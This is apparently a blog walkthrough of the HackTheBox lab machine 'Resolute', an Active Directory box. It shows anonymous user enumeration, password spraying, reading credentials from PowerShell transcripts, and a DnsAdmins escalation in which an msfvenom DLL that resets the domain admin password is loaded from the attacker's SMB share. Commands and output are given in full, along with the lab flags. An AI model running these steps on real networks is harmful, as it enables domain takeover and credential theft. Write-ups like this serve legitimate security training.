---
layout: post
title: Hackthebox Resolute Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-06-01/resolute.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Resolute`.

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.169 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 21:29 EEST
Nmap scan report for 10.10.10.169
Host is up (0.041s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  tcpwrapped
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-30 18:44:00Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49712/tcp open  msrpc        Microsoft Windows RPC
53955/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h33m37s, deviation: 4h02m31s, median: 13m35s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-05-30T11:44:52-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-05-30T18:44:51
|_  start_date: 2020-05-30T10:58:30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.21 seconds
```

### Edit `/etc/hosts`
```shell
root@kali:~# cat /etc/hosts | grep resolute
10.10.10.169 resolute.megabank.local
```

### SMB enumeration
```shell
root@kali:~# smbclient -N -L resolute.megabank.local
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

### RPC enumeration
```shell
root@kali:~# rpcclient -U "" -N resolute.megabank.local
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
rpcclient $> 
```

### LDAP enumeration
We can use [Windapserach](https://github.com/ropnop/windapsearch)
```shell
root@kali:~/windapsearch# python3 windapsearch.py -d resolute.megabank.local --dc-ip 10.10.10.169 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.169
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=megabank,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 25 users: 

cn: Guest

cn: DefaultAccount

cn: Ryan Bertrand
userPrincipalName: ryan@megabank.local

cn: Marko Novak
userPrincipalName: marko@megabank.local

cn: Sunita Rahman
userPrincipalName: sunita@megabank.local

cn: Abigail Jeffers
userPrincipalName: abigail@megabank.local

cn: Marcus Strong
userPrincipalName: marcus@megabank.local

cn: Sally May
userPrincipalName: sally@megabank.local

cn: Fred Carr
userPrincipalName: fred@megabank.local

cn: Angela Perkins
userPrincipalName: angela@megabank.local

cn: Felicia Carter
userPrincipalName: felicia@megabank.local

cn: Gustavo Pallieros
userPrincipalName: gustavo@megabank.local

cn: Ulf Berg
userPrincipalName: ulf@megabank.local

cn: Stevie Gerrard
userPrincipalName: stevie@megabank.local

cn: Claire Norman
userPrincipalName: claire@megabank.local

cn: Paulo Alcobia
userPrincipalName: paulo@megabank.local

cn: Steve Rider
userPrincipalName: steve@megabank.local

cn: Annette Nilsson
userPrincipalName: annette@megabank.local

cn: Annika Larson
userPrincipalName: annika@megabank.local

cn: Per Olsson
userPrincipalName: per@megabank.local

cn: Claude Segal
userPrincipalName: claude@megabank.local

cn: Melanie Purkis
userPrincipalName: melanie@megabank.local

cn: Zach Armstrong
userPrincipalName: zach@megabank.local

cn: Simon Faraday
userPrincipalName: simon@megabank.local

cn: Naoki Yamamoto
userPrincipalName: naoki@megabank.local


[*] Bye!
```


## 2. Getting User
By digging into the RPC/LDAP more, we can find an interesting comment about password for usr `marco`.
```
Account created. Password set to Welcome123!
```

### RPC method
```shell
root@kali:~# rpcclient -U "" -N resolute.megabank.local
rpcclient $> querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)
rpcclient $> 
```

### windapsearch method
```shell
root@kali:~/windapsearch# python3 windapsearch.py -d resolute.megabank.local --dc-ip 10.10.10.169 -U --full | grep Password
badPasswordTime: 132353151421935773
badPasswordTime: 132353151422874007
badPasswordTime: 132353152879282655
description: Account created. Password set to Welcome123!
badPasswordTime: 132353151423811264
badPasswordTime: 132353151424280113
badPasswordTime: 132353151424748276
badPasswordTime: 132353151425217370
badPasswordTime: 132353151425686408
badPasswordTime: 132353151426154386
badPasswordTime: 132353151426779615
badPasswordTime: 132353151427248484
badPasswordTime: 132353151427717179
badPasswordTime: 132353151428185890
badPasswordTime: 132353151428654856
badPasswordTime: 132353151429123234
badPasswordTime: 132353151429591929
badPasswordTime: 132353151430060736
badPasswordTime: 132353151430529508
badPasswordTime: 132353151431154629
badPasswordTime: 132353151431623355
badPasswordTime: 132353151432091815
badPasswordTime: 0
badPasswordTime: 132353151433342441
badPasswordTime: 132353151433811193
badPasswordTime: 132353151434279837
```

However, the credential for user `marco` does not work.<br>
Then, try password spraying with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec/releases/tag/v5.0.1dev).<br>
(No APT version due to an error!!)

### Create user list
```shell
root@kali:~# cat users.txt 
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

### Password spraying with `crackmapexec`
```shell
root@kali:~# ./cme smb 10.10.10.169 -u users.txt -p 'Welcome123!' --continue-on-success
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:MEGABANK) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\melanie:Welcome123! 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\zach:Welcome123! STATUS_ACCESS_DENIED 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\simon:Welcome123! STATUS_ACCESS_DENIED 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\naoki:Welcome123! STATUS_ACCESS_DENIED
```

### Credential
We found the following credential.
```shell
MEGABANK\melanie:Welcome123! 
```

Using `evil-winrm`, we can login as an user `melanie`.<br>
`user.txt` is in the directory `C:\Users\melanie\desktop\`.
```shell
root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.169 -P 5985 -u melanie -p 'Welcome123!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
megabank\melanie
*Evil-WinRM* PS C:\Users\melanie\Documents> type C:\Users\melanie\desktop\user.txt
0c3be45fcfe249796ccbee8d3a978540
```


## 3. Getting Root

Try to enumerate the server, we can find a hidden directory `PSTranscripts` with the following command.
```shell
*Evil-WinRM* PS C:\> ls -Hidden


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        5/30/2020   3:58 AM      402653184 pagefile.sys
```

Going the `PSTranscripts` and show the hidden file again.<br>
We can find an interesting directory `20191203`.
```shell
*Evil-WinRM* PS C:\PSTranscripts> ls -Hidden


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203
```


```shell
*Evil-WinRM* PS C:\PSTranscripts\20191203> ls -Hidden


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```


```shell
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

It looks like user `ryan` is trying to execute a command and plain text password is there.
```shell
ryan:Serv3r4Admin4cc123!
```

This time again, we can use `evil-winrm` to login to the server.
```shell
root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.169 -P 5985 -u ryan -p 'Serv3r4Admin4cc123!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
megabank\ryan
```

Then, check the permission for user `ryan`. We can find that this user is in the group `DnsAdmins`.
```shell
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

According to [this article](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83), giving DnsAdmin permission for general user can be abused.<br>
First, we need to create a payload for that.
```shell
root@kali:~# msfvenom -p windows/x64/exec cmd='net user administrator Passw0rd! /domain' -f dll > exploit.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 308 bytes
Final size of dll file: 5120 bytes

```

Since there is a possibility that transferring the exploit may trigger the Windows Defender, we use `smbserver.py` of [Impacket](https://github.com/SecureAuthCorp/impacket).
```shell
root@kali:~# /usr/share/doc/python3-impacket/examples/smbserver.py share ./
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

[dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) has an option `/serverlevelplugindll` to load an external dll filea nd we can take advantage of that.<br>
After setting the configuration, we have to restart the DNS server with `sc` command.
```shell
*Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.22\share\exploit.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2780
        FLAGS              :
```

We can confirm that after we relaunched the DNS service on resolute, we get a connection from the server.
```shell
root@kali:~# /usr/share/doc/python3-impacket/examples/smbserver.py share ./
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.169,59029)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:4141414141414141:4f498ad939427d77da69ca3866a24442:010100000000000000d312c22438d6013c83364c73471d6500000000010010004a005400490077005700410043004800020010006d0061006e00530074006b0079006100030010004a005400490077005700410043004800040010006d0061006e00530074006b00790061000700080000d312c22438d60106000400020000000800300030000000000000000000000000400000fc786036f3c0c9ce31c07b3d867ec994c23d03b596d1d9337a2f2c9c1dfcc8bc0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320032000000000000000000
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SHARE)
[*] Closing down connection (10.10.10.169,59029)
[*] Remaining connections []

```

Since we've changed the password for the domain administrator, we can login with `psexec.py`.<br>
`root.txt` is in the directory `C:\Users\Administrator\Desktop\root.txt`.
```shell
root@kali:~# psexec.py megabank.local/administrator@10.10.10.169
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.169.....
[*] Found writable share ADMIN$
[*] Uploading file nmYVKXWG.exe
[*] Opening SVCManager on 10.10.10.169.....
[*] Creating service krnp on 10.10.10.169.....
[*] Starting service krnp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
e1d94876a506850d0c20edb5405e619c
```
